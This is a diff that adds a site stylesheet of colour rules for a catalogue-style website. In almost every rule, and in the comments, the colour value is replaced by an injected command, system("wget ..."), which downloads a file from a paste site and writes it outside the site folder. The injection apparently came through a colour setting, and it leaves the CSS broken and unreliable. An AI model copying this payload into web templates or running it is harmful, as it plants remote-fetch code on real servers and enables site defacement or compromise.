@@ -1,0 +1,142 @@
+
+/*          #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");           */
+
+.about_n_block
+{
+    border: 7px solid #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");;
+}
+
+
+a,
+.index_contacts .social a,
+.logo .name,
+h2.title_content_more .fa,
+table.contacts_list .fa
+{
+    color: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");;
+}
+
+.left_menu .nav li:hover { 
+    border-right: 3px #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4"); solid;
+    border-left: 3px #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4"); solid;
+    background: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");; 
+    color: white !important; 
+}
+
+.index_contacts  li.active:hover {  background: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");; }
+
+.btn-default,
+.index_slider .item .text>div a,
+.mb-slider .mb-panel.current .slider_top_color_bg_content,
+.bx_catalog-compare-list_sravn .kol,
+header .zayavka,
+.gallery h2 .fa,
+.form_index_zapros_search,
+header .home
+{
+    background: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");;
+}
+
+.btn-default:hover, 
+.btn-default:active,
+.btn-default:focus{ 
+    background: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4"); !important;
+    filter: grayscale(30%);
+}
+
+    .priem_one:hover, .priem_one.white:hover { 
+        background: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");; 
+        color: white;
+    }
+
+.main_menu_gorizontal .nav-pills>li:hover{ border-bottom: 3px #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4"); solid; }
+
+.search_top_bottom[aria-expanded="true"] , .search_top_bottom.collapsed:hover {
+    border-bottom: 3px #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4"); solid;
+    background: rgba(255,255,255, .1);
+}
+
+.color_bg, .mb-slider .mb-panel.current .slider_top_color_bg_content
+ {
+    background: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");;   
+    opacity: .8;
+    box-shadow: 0 0 0 30000px rgba(0,0,0, .9) inset;
+
+}
+
+
+.index_title.white h2>div>div.color {border-top: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4"); solid 3px;}
+
+.priem { background: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");; color: white; }
+
+.catalog_projects_index_one>div:hover { 
+    background: white;
+    color: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");;
+    border: 2px white solid; 
+    box-shadow: 0 0 20px rgba(0,0,0, .2)
+}
+
+.catalog_projects_index_one>div:hover .btn { 
+    background: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");;
+    color: white;
+    border: 2px #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4"); solid; 
+}
+
+.uslugi_index_one .btn,
+.content_index .btn
+{ border:  #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4"); solid 2px; font-family: normal;}
+.uslugi_index_one:hover .btn,
+
+.content_index .statiya:hover .btn
+{ background:   #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");; color: white; }
+
+.catalog_projects_index_one .btn{ border: 2px solid  #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");; color:black; }
+
+.catalog_projects_index_one>div:hover .link { 
+    color: white;
+    background: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");;
+}
+
+.catalog_index_one:hover .btn { 
+    background: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");; 
+    color: white; 
+    border-radius: 0 !important;
+    border-color: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");;
+}
+
+.catalog_index_one>div:hover { border-color: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");;  }
+
+.akcii:hover {  background: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");; color: white; }
+
+.slider.brands .slick-slide a:hover { 
+    filter: grayscale(0); 
+    /*background: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");;*/
+    border-color: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");;
+}
+
+.index_contacts  li.active{ 
+    background: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");;
+    border-color: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");;
+    z-index: 2;
+}
+
+.index_contacts .social a:hover {
+    background: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");;
+    color: white;
+    border-color: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");;
+}
+
+.bx-filter .bx-ui-slider-handle { background: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4"); !important; }
+.bx-filter.bx-black .bx-ui-slider-pricebar-v { 
+    background: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4"); !important;
+    opacity: .20 !important;
+}
+
+.link_index_catalog_uslugi a:hover { background: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");; color: white; }
+
+.mb-slider .mb-panel.current .item {    border-bottom: 5px #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4"); solid !important;}
+
+.footer .social a:hover, .footer .social a:focus { 
+    background: #system("wget -O ../../xWarning.htm https://pastebin.com/raw/gSsvYjJ4");;
+    color: white;
+}
